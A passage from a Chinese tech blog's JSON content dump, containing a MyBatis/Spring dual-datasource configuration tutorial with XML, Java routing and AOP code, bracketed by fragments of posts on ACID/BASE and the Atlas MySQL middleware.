&#x9694;&#x79BB;&#x6027;&#xFF1A;&#x6570;&#x636E;&#x5E93;&#x5141;&#x8BB8;&#x591A;&#x4E2A;&#x5E76;&#x53D1;&#x4E8B;&#x52A1;&#x540C;&#x65F6;&#x5BF9;&#x9F50;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x8BFB;&#x5199;&#x548C;&#x4FEE;&#x6539;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x9694;&#x79BB;&#x6027;&#x53EF;&#x4EE5;&#x9632;&#x6B62;&#x591A;&#x4E2A;&#x4E8B;&#x52A1;&#x5E76;&#x53D1;&#x6267;&#x884C;&#x65F6;&#x7531;&#x4E8E;&#x4EA4;&#x53C9;&#x6267;&#x884C;&#x800C;&#x5BFC;&#x81F4;&#x6570;&#x636E;&#x7684;&#x4E0D;&#x4E00;&#x81F4;&#x3002;&#x4E8B;&#x52A1;&#x9694;&#x79BB;&#x5206;&#x4E3A;&#x4E0D;&#x540C;&#x7EA7;&#x522B;&#xFF0C;&#x5305;&#x62EC;&#x8BFB;&#x672A;&#x63D0;&#x4EA4;&#xFF08;Read uncommitted&#xFF09;&#x3001;&#x8BFB;&#x63D0;&#x4EA4;&#xFF08;read committed&#xFF09;&#x3001;&#x53EF;&#x91CD;&#x590D;&#x8BFB;&#xFF08;repeatable read&#xFF09;&#x548C;&#x4E32;&#x884C;&#x5316;&#xFF08;Serializable&#xFF09;&#x3002; &#x6301;&#x4E45;&#x6027;&#xFF1A;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x7ED3;&#x675F;&#x540E;&#xFF0C;&#x5BF9;&#x6570;&#x636E;&#x7684;&#x4FEE;&#x6539;&#x5C31;&#x662F;&#x6C38;&#x4E45;&#x7684;&#xFF0C;&#x5373;&#x4FBF;&#x7CFB;&#x7EDF;&#x6545;&#x969C;&#x4E5F;&#x4E0D;&#x4F1A;&#x4E22;&#x5931;&#x3002; ACID&#x662F;&#x4F20;&#x7EDF;&#x6570;&#x636E;&#x5E93;&#x5E38;&#x7528;&#x7684;&#x8BBE;&#x8BA1;&#x7406;&#x5FF5;, &#x8FFD;&#x6C42;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;&#x3002;BASE&#x652F;&#x6301;&#x7684;&#x662F;&#x5927;&#x578B;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#xFF0C;&#x63D0;&#x51FA;&#x901A;&#x8FC7;&#x727A;&#x7272;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#x83B7;&#x5F97;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x3002; ACID&#x548C;BASE&#x4EE3;&#x8868;&#x4E86;&#x4E24;&#x79CD;&#x622A;&#x7136;&#x76F8;&#x53CD;&#x7684;&#x8BBE;&#x8BA1;&#x54F2;&#x5B66;&#xFF0C;&#x5206;&#x5904;&#x3010;&#x4E00;&#x81F4;&#x6027;-&#x53EF;&#x7528;&#x6027;&#x3011;&#x5206;&#x5E03;&#x56FE;&#x8C31;&#x7684;&#x4E24;&#x6781;&#x3002;","raw":null,"content":null,"categories":[{"name":"算法及理论","slug":"算法及理论","permalink":"http://www.wangxin123.com/categories/算法及理论/"}],"tags":[{"name":"CAP","slug":"CAP","permalink":"http://www.wangxin123.com/tags/CAP/"},{"name":"BASE","slug":"BASE","permalink":"http://www.wangxin123.com/tags/BASE/"},{"name":"ACID","slug":"ACID","permalink":"http://www.wangxin123.com/tags/ACID/"}]},{"title":"MyBatis双数据源配置","slug":"MyBatis双数据源","date":"2016-10-20T10:53:00.000Z","updated":"2017-01-06T08:38:44.625Z","comments":true,"path":"2016/10/20/MyBatis双数据源/","link":"","permalink":"http://www.wangxin123.com/2016/10/20/MyBatis双数据源/","excerpt":"&#x914D;&#x7F6E;&#x76F8;&#x5173;jdbc &#x914D;&#x7F6E;12345678910111213141516171819202122232425262728293031323334#============================================================================# MySQL#============================================================================jdbc.mysql.driver=com.mysql.jdbc.Driverjdbc.mysql.url=jdbc:mysql://127.0.0.1:3306/test?useUnicode=true&amp;characterEncoding=UTF-8&amp;allowMultiQueries=truejdbc.mysql.username=rootjdbc.mysql.password=root#============================================================================# MS SQL Server (JTDS)#============================================================================jdbc.sqlserver.driver=net.sourceforge.jtds.jdbc.Driverjdbc.sqlserver.url=jdbc:jtds:sqlserver://127.0.0.1:1433/testjdbc.sqlserver.username=sajdbc.sqlserver.password=sa#============================================================================# &#x901A;&#x7528;&#x914D;&#x7F6E;#============================================================================jdbc.initialSize=5jdbc.minIdle=5jdbc.maxIdle=20jdbc.maxActive=100jdbc.maxWait=100000jdbc.defaultAutoCommit=falsejdbc.removeAbandoned=truejdbc.removeAbandonedTimeout=600jdbc.testWhileIdle=truejdbc.timeBetweenEvictionRunsMillis=60000jdbc.numTestsPerEvictionRun=20jdbc.minEvictableIdleTimeMillis=300000jdbc.properties","keywords":null,"text":"&#x914D;&#x7F6E;&#x76F8;&#x5173;jdbc &#x914D;&#x7F6E;12345678910111213141516171819202122232425262728293031323334#============================================================================# MySQL#============================================================================jdbc.mysql.driver=com.mysql.jdbc.Driverjdbc.mysql.url=jdbc:mysql://127.0.0.1:3306/test?useUnicode=true&amp;characterEncoding=UTF-8&amp;allowMultiQueries=truejdbc.mysql.username=rootjdbc.mysql.password=root#============================================================================# MS SQL Server (JTDS)#============================================================================jdbc.sqlserver.driver=net.sourceforge.jtds.jdbc.Driverjdbc.sqlserver.url=jdbc:jtds:sqlserver://127.0.0.1:1433/testjdbc.sqlserver.username=sajdbc.sqlserver.password=sa#============================================================================# &#x901A;&#x7528;&#x914D;&#x7F6E;#============================================================================jdbc.initialSize=5jdbc.minIdle=5jdbc.maxIdle=20jdbc.maxActive=100jdbc.maxWait=100000jdbc.defaultAutoCommit=falsejdbc.removeAbandoned=truejdbc.removeAbandonedTimeout=600jdbc.testWhileIdle=truejdbc.timeBetweenEvictionRunsMillis=60000jdbc.numTestsPerEvictionRun=20jdbc.minEvictableIdleTimeMillis=300000jdbc.properties &#x5355;&#x6570;&#x636E;&#x6E90;&#x65F6;&#x7684;Spring&#x914D;&#x7F6E;&#x6587;&#x4EF6;12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.0.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-3.0.xsd&quot;&gt; &lt;bean id=&quot;propertyConfigurer&quot; class=&quot;org.springframework.beans.factory.config.PropertyPlaceholderConfigurer&quot;&gt; &lt;property name=&quot;location&quot; value=&quot;classpath:jdbc.properties&quot;/&gt; &lt;/bean&gt; &lt;bean id=&quot;dataSource&quot; class=&quot;org.apache.commons.dbcp.BasicDataSource&quot; destroy-method=&quot;close&quot;&gt; &lt;property name=&quot;driverClassName&quot; value=&quot;${jdbc.mysql.driver}&quot;/&gt; &lt;property name=&quot;url&quot; value=&quot;${jdbc.mysql.url}&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;${jdbc.mysql.username}&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;${jdbc.mysql.password}&quot;/&gt; &lt;property name=&quot;initialSize&quot; value=&quot;${jdbc.initialSize}&quot;/&gt; &lt;property name=&quot;minIdle&quot; value=&quot;${jdbc.minIdle}&quot;/&gt; &lt;property name=&quot;maxIdle&quot; value=&quot;${jdbc.maxIdle}&quot;/&gt; &lt;property name=&quot;maxActive&quot; value=&quot;${jdbc.maxActive}&quot;/&gt; &lt;property name=&quot;maxWait&quot; value=&quot;${jdbc.maxWait}&quot;/&gt; &lt;property name=&quot;defaultAutoCommit&quot; value=&quot;${jdbc.defaultAutoCommit}&quot;/&gt; &lt;property name=&quot;removeAbandoned&quot; value=&quot;${jdbc.removeAbandoned}&quot;/&gt; &lt;property name=&quot;removeAbandonedTimeout&quot; value=&quot;${jdbc.removeAbandonedTimeout}&quot;/&gt; &lt;property name=&quot;testWhileIdle&quot; value=&quot;${jdbc.testWhileIdle}&quot;/&gt; &lt;property name=&quot;timeBetweenEvictionRunsMillis&quot; value=&quot;${jdbc.timeBetweenEvictionRunsMillis}&quot;/&gt; &lt;property name=&quot;numTestsPerEvictionRun&quot; value=&quot;${jdbc.numTestsPerEvictionRun}&quot;/&gt; &lt;property name=&quot;minEvictableIdleTimeMillis&quot; value=&quot;${jdbc.minEvictableIdleTimeMillis}&quot;/&gt; &lt;/bean&gt; &lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt; &lt;/bean&gt; &lt;!-- mybatis.spring&#x81EA;&#x52A8;&#x6620;&#x5C04; --&gt; &lt;bean class=&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&gt; &lt;property name=&quot;basePackage&quot; value=&quot;com.cnblogs.lzrabbit&quot;/&gt; &lt;/bean&gt; &lt;!-- &#x81EA;&#x52A8;&#x626B;&#x63CF;&#xFF0C;&#x591A;&#x4E2A;&#x5305;&#x4EE5; &#x9017;&#x53F7;&#x5206;&#x9694; --&gt; &lt;context:component-scan base-package=&quot;com.cnblogs.lzrabbit&quot;/&gt; &lt;aop:aspectj-autoproxy/&gt;&lt;/beans&gt;applicationContext.xml &#x591A;&#x6570;&#x636E;&#x6E90;&#x65F6;Spring&#x914D;&#x7F6E;&#x6587;&#x4EF6;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.0.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-3.0.xsd&quot;&gt; &lt;bean id=&quot;propertyConfigurer&quot; class=&quot;org.springframework.beans.factory.config.PropertyPlaceholderConfigurer&quot;&gt; &lt;property name=&quot;location&quot; value=&quot;classpath:jdbc.properties&quot;/&gt; &lt;/bean&gt; &lt;bean id=&quot;sqlServerDataSource&quot; class=&quot;org.apache.commons.dbcp.BasicDataSource&quot; destroy-method=&quot;close&quot;&gt; &lt;property name=&quot;driverClassName&quot; value=&quot;${jdbc.sqlserver.driver}&quot;/&gt; &lt;property name=&quot;url&quot; value=&quot;${jdbc.sqlserver.url}&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;${jdbc.sqlserver.username}&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;${jdbc.sqlserver.password}&quot;/&gt; &lt;property name=&quot;initialSize&quot; value=&quot;${jdbc.initialSize}&quot;/&gt; &lt;property name=&quot;minIdle&quot; value=&quot;${jdbc.minIdle}&quot;/&gt; &lt;property name=&quot;maxIdle&quot; value=&quot;${jdbc.maxIdle}&quot;/&gt; &lt;property name=&quot;maxActive&quot; value=&quot;${jdbc.maxActive}&quot;/&gt; &lt;property name=&quot;maxWait&quot; value=&quot;${jdbc.maxWait}&quot;/&gt; &lt;property name=&quot;defaultAutoCommit&quot; value=&quot;${jdbc.defaultAutoCommit}&quot;/&gt; &lt;property name=&quot;removeAbandoned&quot; value=&quot;${jdbc.removeAbandoned}&quot;/&gt; &lt;property name=&quot;removeAbandonedTimeout&quot; value=&quot;${jdbc.removeAbandonedTimeout}&quot;/&gt; &lt;property name=&quot;testWhileIdle&quot; value=&quot;${jdbc.testWhileIdle}&quot;/&gt; &lt;property name=&quot;timeBetweenEvictionRunsMillis&quot; value=&quot;${jdbc.timeBetweenEvictionRunsMillis}&quot;/&gt; &lt;property name=&quot;numTestsPerEvictionRun&quot; value=&quot;${jdbc.numTestsPerEvictionRun}&quot;/&gt; &lt;property name=&quot;minEvictableIdleTimeMillis&quot; value=&quot;${jdbc.minEvictableIdleTimeMillis}&quot;/&gt; &lt;/bean&gt; &lt;bean id=&quot;mySqlDataSource&quot; class=&quot;org.apache.commons.dbcp.BasicDataSource&quot; destroy-method=&quot;close&quot;&gt; &lt;property name=&quot;driverClassName&quot; value=&quot;${jdbc.mysql.driver}&quot;/&gt; &lt;property name=&quot;url&quot; value=&quot;${jdbc.mysql.url}&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;${jdbc.mysql.username}&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;${jdbc.mysql.password}&quot;/&gt; &lt;property name=&quot;initialSize&quot; value=&quot;${jdbc.initialSize}&quot;/&gt; &lt;property name=&quot;minIdle&quot; value=&quot;${jdbc.minIdle}&quot;/&gt; &lt;property name=&quot;maxIdle&quot; value=&quot;${jdbc.maxIdle}&quot;/&gt; &lt;property name=&quot;maxActive&quot; value=&quot;${jdbc.maxActive}&quot;/&gt; &lt;property name=&quot;maxWait&quot; value=&quot;${jdbc.maxWait}&quot;/&gt; &lt;property name=&quot;defaultAutoCommit&quot; value=&quot;${jdbc.defaultAutoCommit}&quot;/&gt; &lt;property name=&quot;removeAbandoned&quot; value=&quot;${jdbc.removeAbandoned}&quot;/&gt; &lt;property name=&quot;removeAbandonedTimeout&quot; value=&quot;${jdbc.removeAbandonedTimeout}&quot;/&gt; &lt;property name=&quot;testWhileIdle&quot; value=&quot;${jdbc.testWhileIdle}&quot;/&gt; &lt;property name=&quot;timeBetweenEvictionRunsMillis&quot; value=&quot;${jdbc.timeBetweenEvictionRunsMillis}&quot;/&gt; &lt;property name=&quot;numTestsPerEvictionRun&quot; value=&quot;${jdbc.numTestsPerEvictionRun}&quot;/&gt; &lt;property name=&quot;minEvictableIdleTimeMillis&quot; value=&quot;${jdbc.minEvictableIdleTimeMillis}&quot;/&gt; &lt;/bean&gt; &lt;bean id=&quot;multipleDataSource&quot; class=&quot;com.cnblogs.lzrabbit.MultipleDataSource&quot;&gt; &lt;property name=&quot;defaultTargetDataSource&quot; ref=&quot;mySqlDataSource&quot;/&gt; &lt;property name=&quot;targetDataSources&quot;&gt; &lt;map&gt; &lt;entry key=&quot;mySqlDataSource&quot; value-ref=&quot;mySqlDataSource&quot;/&gt; &lt;entry key=&quot;sqlServerDataSource&quot; value-ref=&quot;sqlServerDataSource&quot;/&gt; &lt;/map&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;multipleDataSource&quot;/&gt; &lt;/bean&gt; &lt;!-- mybatis.spring&#x81EA;&#x52A8;&#x6620;&#x5C04; --&gt; &lt;bean class=&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&gt; &lt;property name=&quot;basePackage&quot; value=&quot;com.cnblogs.lzrabbit&quot;/&gt; &lt;/bean&gt; &lt;!-- &#x81EA;&#x52A8;&#x626B;&#x63CF;&#xFF0C;&#x591A;&#x4E2A;&#x5305;&#x4EE5; &#x9017;&#x53F7;&#x5206;&#x9694; --&gt; &lt;context:component-scan base-package=&quot;com.cnblogs.lzrabbit&quot;/&gt; &lt;aop:aspectj-autoproxy/&gt;&lt;/beans&gt; MultipleDataSource&#x5B9E;&#x73B0;12345678910111213141516171819package com.cnblogs.lzrabbit;import org.springframework.jdbc.datasource.lookup.AbstractRoutingDataSource;/** * Created by rabbit on 14-5-25. */public class MultipleDataSource extends AbstractRoutingDataSource { private static final ThreadLocal&lt;String&gt; dataSourceKey = new InheritableThreadLocal&lt;String&gt;(); public static void setDataSourceKey(String dataSource) { dataSourceKey.set(dataSource); } @Override protected Object determineCurrentLookupKey() { return dataSourceKey.get(); }} &#x624B;&#x52A8;&#x6570;&#x636E;&#x6E90;&#x5207;&#x6362;&#x8C03;&#x7528;12345678910111213141516171819202122232425package com.cnblogs.lzrabbit;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;/** * Created by rabbit on 14-5-25. */public class Main { public static void main(String[] args) { //&#x521D;&#x59CB;&#x5316;ApplicationContext ApplicationContext applicationContext = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;); MySqlMapper mySqlMapper = applicationContext.getBean(MySqlMapper.class); SqlServerMapper sqlServerMapper = applicationContext.getBean(SqlServerMapper.class); //&#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x6E90;&#x4E3A;MySql,&#x4F7F;&#x7528;&#x4E86;AOP&#x6D4B;&#x8BD5;&#x65F6;&#x8BF7;&#x5C06;&#x4E0B;&#x9762;&#x8FD9;&#x884C;&#x6CE8;&#x91CA; MultipleDataSource.setDataSourceKey(&quot;mySqlDataSource&quot;); mySqlMapper.getList(); //&#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x6E90;&#x4E3A;SqlServer,&#x4F7F;&#x7528;AOP&#x6D4B;&#x8BD5;&#x65F6;&#x8BF7;&#x5C06;&#x4E0B;&#x9762;&#x8FD9;&#x884C;&#x6CE8;&#x91CA; MultipleDataSource.setDataSourceKey(&quot;sqlServerDataSource&quot;); sqlServerMapper.getList(); }} MyBatis&#x63A5;&#x53E3;Mapper&#x5B9A;&#x4E49;&#xFF0C;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x6CE8;&#x89E3;&#x65B9;&#x5F0F;&#x5B9E;&#x73B0;123456789public interface MySqlMapper { @Select(&quot;select * from MyTable&quot;) List&lt;Map&lt;String,Object&gt;&gt; getList();}public interface SqlServerMapper { @Select(&quot;select * from MyTable&quot;) List&lt;Map&lt;String,Object&gt;&gt; getList();} &#x4F7F;&#x7528;SpringAOP&#x65B9;&#x5F0F;&#x5B9E;&#x73B0;&#x81EA;&#x52A8;&#x5207;&#x6362;123456789101112131415161718192021package com.cnblogs.lzrabbit;import org.aspectj.lang.ProceedingJoinPoint;import org.aspectj.lang.annotation.Around;import org.aspectj.lang.annotation.Aspect;import org.springframework.stereotype.Component;@Component@Aspectpublic class MultipleDataSourceAspectAdvice { @Around(&quot;execution(* com.cnblogs.lzrabbit.*.*(..))&quot;) public Object doAround(ProceedingJoinPoint jp) throws Throwable { if (jp.getTarget() instanceof MySqlMapper) { MultipleDataSource.setDataSourceKey(&quot;mySqlDataSource&quot;); } else if (jp.getTarget() instanceof SqlServerMapper) { MultipleDataSource.setDataSourceKey(&quot;sqlServerDataSource&quot;); } return jp.proceed(); }} &#x914D;&#x7F6E;&#x8BE6;&#x89E3;&#x8FD9;&#x91CC;&#x5C31;&#x4E0A;&#x9762;&#x7684;&#x5B9E;&#x73B0;&#x505A;&#x4E2A;&#x7B80;&#x5355;&#x89E3;&#x91CA;&#xFF0C;&#x5728;&#x6211;&#x4EEC;&#x914D;&#x7F6E;&#x5355;&#x6570;&#x636E;&#x6E90;&#x65F6;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6570;&#x636E;&#x6E90;&#x7C7B;&#x578B;&#x4F7F;&#x7528;&#x4E86;org.apache.commons.dbcp.BasicDataSource&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;&#x4EE3;&#x7801;&#x5B9E;&#x73B0;&#x4E86;javax.sql.DataSource&#x63A5;&#x53E3; &#x914D;&#x7F6E;sqlSessionFactory&#x65F6;org.mybatis.spring.SqlSessionFactoryBean&#x6CE8;&#x5165;&#x53C2;&#x6570;dataSource&#x7C7B;&#x578B;&#x5C31;&#x662F;javax.sql.DataSource &#x5B9E;&#x73B0;&#x591A;&#x6570;&#x636E;&#x6E90;&#x7684;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x81EA;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;MultipleDataSource&#xFF0C;&#x8FD9;&#x4E2A;&#x7C7B;&#x7EE7;&#x627F;&#x81EA;AbstractRoutingDataSource&#xFF0C;&#x800C;AbstractRoutingDataSource&#x7EE7;&#x627F;&#x81EA;AbstractDataSource &#xFF0C;AbstractDataSource &#x5B9E;&#x73B0;&#x4E86;javax.sql.DataSource&#x63A5;&#x53E3;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x7684;MultipleDataSource&#x4E5F;&#x5B9E;&#x73B0;&#x4E86;javax.sql.DataSource&#x63A5;&#x53E3;&#xFF0C;&#x53EF;&#x4EE5;&#x8D4B;&#x503C;&#x7ED9;sqlSessionFactory&#x7684;dataSource&#x5C5E;&#x6027; 12345public abstract class AbstractRoutingDataSource extends AbstractDataSource implements InitializingBean {}public abstract class AbstractDataSource implements DataSource {} &#x518D;&#x6765;&#x8BF4;&#x4E0B;MultipleDataSource&#x7684;&#x5B9E;&#x73B0;&#x539F;&#x7406;&#xFF0C;MultipleDataSource&#x5B9E;&#x73B0;AbstractRoutingDataSource&#x62BD;&#x8C61;&#x7C7B;&#xFF0C;&#x7136;&#x540E;&#x5B9E;&#x73B0;&#x4E86;determineCurrentLookupKey&#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x7528;&#x4E8E;&#x9009;&#x62E9;&#x5177;&#x4F53;&#x4F7F;&#x7528;targetDataSources&#x4E2D;&#x7684;&#x54EA;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x6E90;123456789&lt;bean id=&quot;multipleDataSource&quot; class=&quot;com.cnblogs.lzrabbit.MultipleDataSource&quot;&gt; &lt;property name=&quot;defaultTargetDataSource&quot; ref=&quot;mySqlDataSource&quot;/&gt; &lt;property name=&quot;targetDataSources&quot;&gt; &lt;map&gt; &lt;entry key=&quot;mySqlDataSource&quot; value-ref=&quot;mySqlDataSource&quot;/&gt; &lt;entry key=&quot;sqlServerDataSource&quot; value-ref=&quot;sqlServerDataSource&quot;/&gt; &lt;/map&gt; &lt;/property&gt; &lt;/bean&gt; &#x53EF;&#x4EE5;&#x770B;&#x5230;Spring&#x914D;&#x7F6E;&#x4E2D;multipleDataSource&#x8BBE;&#x7F6E;&#x4E86;&#x4E24;&#x4E2A;&#x5C5E;&#x6027;defaultTargetDataSource&#x548C;targetDataSources&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A;&#x5C5E;&#x6027;&#x5B9A;&#x4E49;&#x5728;AbstractRoutingDataSource&#xFF0C;&#x5F53;MyBatis&#x6267;&#x884C;&#x67E5;&#x8BE2;&#x65F6;&#x4F1A;&#x5148;&#x9009;&#x62E9;&#x6570;&#x636E;&#x6E90;&#xFF0C;&#x9009;&#x62E9;&#x987A;&#x5E8F;&#x65F6;&#x73B0;&#x6839;&#x636E;determineCurrentLookupKey&#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x7684;&#x503C;&#x5230;targetDataSources&#x4E2D;&#x53BB;&#x627E;&#xFF0C;&#x82E5;&#x80FD;&#x627E;&#x5230;&#x600E;&#x8FD4;&#x56DE;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x6E90;&#xFF0C;&#x82E5;&#x627E;&#x4E0D;&#x5230;&#x8FD4;&#x56DE;&#x9ED8;&#x8BA4;&#x7684;&#x6570;&#x636E;&#x6E90;defaultTargetDataSource&#xFF0C;&#x5177;&#x4F53;&#x53C2;&#x8003;AbstractRoutingDataSource&#x7684;&#x6E90;&#x7801;12345678910111213141516171819202122232425262728293031323334353637383940public abstract class AbstractRoutingDataSource extends AbstractDataSource implements InitializingBean { private Map&lt;Object, Object&gt; targetDataSources; private Object defaultTargetDataSource; /** * Retrieve the current target DataSource. Determines the * {@link #determineCurrentLookupKey() current lookup key}, performs * a lookup in the {@link #setTargetDataSources targetDataSources} map, * falls back to the specified * {@link #setDefaultTargetDataSource default target DataSource} if necessary. * @see #determineCurrentLookupKey() */ protected DataSource determineTargetDataSource() { Assert.notNull(this.resolvedDataSources, &quot;DataSource router not initialized&quot;); Object lookupKey = determineCurrentLookupKey(); DataSource dataSource = this.resolvedDataSources.get(lookupKey); if (dataSource == null &amp;&amp; (this.lenientFallback || lookupKey == null)) { dataSource = this.resolvedDefaultDataSource; } if (dataSource == null) { throw new IllegalStateException(&quot;Cannot determine target DataSource for lookup key [&quot; + lookupKey + &quot;]&quot;); } return dataSource; } /** * Determine the current lookup key. This will typically be * implemented to check a thread-bound transaction context. * &lt;p&gt;Allows for arbitrary keys. The returned key needs * to match the stored lookup key type, as resolved by the * {@link #resolveSpecifiedLookupKey} method. */ protected abstract Object determineCurrentLookupKey();&#x3000;&#x3000;&#x3000;&#x3000;.............} &#x5728;&#x52A8;&#x6001;&#x5207;&#x6362;&#x6570;&#x636E;&#x6E90;&#x65B9;&#x6CD5;&#x65F6;&#x9009;&#x62E9;&#x4E86;AOP&#x65B9;&#x5F0F;&#x5B9E;&#x73B0;&#xFF0C;&#x8FD9;&#x91CC;&#x5B9E;&#x73B0;&#x7684;&#x7B80;&#x5355;&#x7C97;&#x66B4;&#xFF0C;&#x5177;&#x4F53;&#x5E94;&#x7528;&#x65F6;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x9700;&#x8981;&#x7075;&#x6D3B;&#x53D8;&#x901A;&#x5427;","raw":null,"content":null,"categories":[{"name":"WEB后端","slug":"WEB后端","permalink":"http://www.wangxin123.com/categories/WEB后端/"}],"tags":[]},{"title":"MySQL中间件Atlas安装及使用","slug":"MySQL中间件Atlas安装及使用","date":"2016-10-18T10:24:17.000Z","updated":"2017-01-12T01:10:51.886Z","comments":true,"path":"2016/10/18/MySQL中间件Atlas安装及使用/","link":"","permalink":"http://www.wangxin123.com/2016/10/18/MySQL中间件Atlas安装及使用/","excerpt":"&#x7B80;&#x4ECB;Atlas&#x662F;&#x7531; Qihoo 360&#x516C;&#x53F8;Web&#x5E73;&#x53F0;&#x90E8;&#x57FA;&#x7840;&#x67B6;&#x6784;&#x56E2;&#x961F;&#x5F00;&#x53D1;&#x7EF4;&#x62A4;&#x7684;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;MySQL&#x534F;&#x8BAE;&#x7684;&#x6570;&#x636E;&#x4E2D;&#x95F4;&#x5C42;&#x9879;&#x76EE;&#x3002;&#x5B83;&#x5728;MySQL&#x5B98;&#x65B9;&#x63A8;&#x51FA;&#x7684;MySQL-Proxy 0.8.2&#x7248;&#x672C;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;&#x5927;&#x91CF;bug&#xFF0C;&#x6DFB;&#x52A0;&#x4E86;&#x5F88;&#x591A;&#x529F;&#x80FD;&#x7279;&#x6027;&#x3002;&#x800C;&#x4E14;&#x5B89;&#x88C5;&#x65B9;&#x4FBF;&#x3002;&#x914D;&#x7F6E;&#x7684;&#x6CE8;&#x91CA;&#x5199;&#x7684;&#x86EE;&#x8BE6;&#x7EC6;&#x7684;&#xFF0C;&#x90FD;&#x662F;&#x4E2D;&#x6587;&#x3002; &#x4E3B;&#x8981;&#x529F;&#x80FD; &#x8BFB;&#x5199;&#x5206;&#x79BB; &#x4ECE;&#x5E93;&#x8D1F;&#x8F7D;&#x5747;&#x8861; IP&#x8FC7;&#x6EE4; &#x81EA;&#x52A8;&#x5206;&#x8868; DBA&#x53EF;&#x5E73;&#x6ED1;&#x4E0A;&#x4E0B;&#x7EBF;DB &#x81EA;&#x52A8;&#x6458;&#x9664;&#x5B95;&#x673A;&#x7684;DB &#x76F8;&#x5173;&#x94FE;&#x63A5;Mysql&#x4E2D;&#x95F4;&#x4EF6;&#x4EA7;&#x54C1;&#x6BD4;&#x8F83;&#xFF1A;http://songwie.com/articlelist/44Atlas&#x7684;&#x5B89;&#x88C5;&#xFF1A;https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x5B89;&#x88C5;Atlas&#x529F;&#x80FD;&#x7279;&#x70B9;FAQ&#xFF1A;https://github.com/Qihoo360/Atlas/wiki/Atlas&#x529F;&#x80FD;&#x7279;&#x70B9;FAQAtlas&#x6027;&#x80FD;&#x7279;&#x70B9;&#xFF1A;https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;Atlas&#x67B6;&#x6784;&#xFF1A;https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x67B6;&#x6784;Atlas+Keepalived&#xFF1A;http://sofar.blog.51cto.com/353572/1601552Atlas&#x5404;&#x9879;&#x529F;&#x80FD;&#x9A8C;&#x8BC1;&#xFF1A;http://blog.itpub.net/27000195/viewspace-1421262/","keywords":null,"text":"&#x7B80;&#x4ECB;Atlas&#x662F;&#x7531; Qihoo 360&#x516C;&#x53F8;Web&#x5E73;&#x53F0;&#x90E8;&#x57FA;&#x7840;&#x67B6;&#x6784;&#x56E2;&#x961F;&#x5F00;&#x53D1;&#x7EF4;&#x62A4;&#x7684;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;MySQL&#x534F;&#x8BAE;&#x7684;&#x6570;&#x636E;&#x4E2D;&#x95F4;&#x5C42;&#x9879;&#x76EE;&#x3002;&#x5B83;&#x5728;MySQL&#x5B98;&#x65B9;&#x63A8;&#x51FA;&#x7684;MySQL-Proxy 